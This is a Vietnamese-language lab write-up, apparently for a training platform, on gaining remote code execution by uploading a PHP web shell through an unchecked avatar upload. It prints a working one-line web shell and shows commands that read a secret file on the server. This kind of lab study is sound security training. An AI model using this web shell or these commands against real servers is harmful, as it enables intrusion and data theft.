# Lab 01: Remote Code Execution via Web Shell Upload

## Mục tiêu
Khai thác chức năng tải lên ảnh đại diện không kiểm tra định dạng tệp để tải lên webshell PHP, thực thi mã nguồn từ xa (RCE) và đọc nội dung tệp `/home/carlos/secret`.

## Đề bài
<img src="images/01_rce-webshell-upload-2026-07-16-05-19-04.png" width="760" />
<br><br>

## Bước 1: Khảo sát chức năng tải lên file
Đăng nhập tài khoản `wiener` với mật khẩu `peter`. Trang thông tin cá nhân cung cấp chức năng tải lên ảnh đại diện:

<img src="images/01_rce-webshell-upload-2026-07-16-05-33-47.png" width="760" />
<br><br>

Thực hiện tải lên một tệp ảnh mẫu bất kỳ và bắt request trong Burp Suite để xác định đường dẫn lưu trữ:

<img src="images/01_rce-webshell-upload-2026-07-16-05-32-42.png" width="760" />
<br><br>

Hệ thống phản hồi thành công và tệp được lưu vào thư mục `avatars/`.

## Bước 2: Tải lên webshell PHP
Gửi request tải lên sang Burp Repeater, sửa tham số `filename` thành `rce.php` và thay thế nội dung tệp bằng mã webshell PHP:

```php
<?php system($_GET['cmd']); ?>
```

<img src="images/01_rce-webshell-upload-2026-07-16-05-21-00.png" width="760" />
<br><br>

Do ứng dụng không kiểm tra định dạng hay nội dung tệp, webshell `rce.php` được tải lên thành công.

## Bước 3: Khai thác RCE và lấy mã bí mật
Truy cập đường dẫn `/files/avatars/rce.php` kèm tham số `cmd=whoami` để kiểm tra khả năng thực thi lệnh:

<img src="images/01_rce-webshell-upload-2026-07-16-05-23-08.png" width="760" />
<br><br>

Hệ thống phản hồi tên người dùng thực thi là `carlos`. Tiếp tục thay đổi tham số thành `cmd=cat /home/carlos/secret` để đọc nội dung file bí mật:

<img src="images/01_rce-webshell-upload-2026-07-16-05-28-21.png" width="760" />
<br><br>

Sao chép mã bí mật thu được và gửi lên hệ thống qua nút **Submit solution** để hoàn thành bài lab.
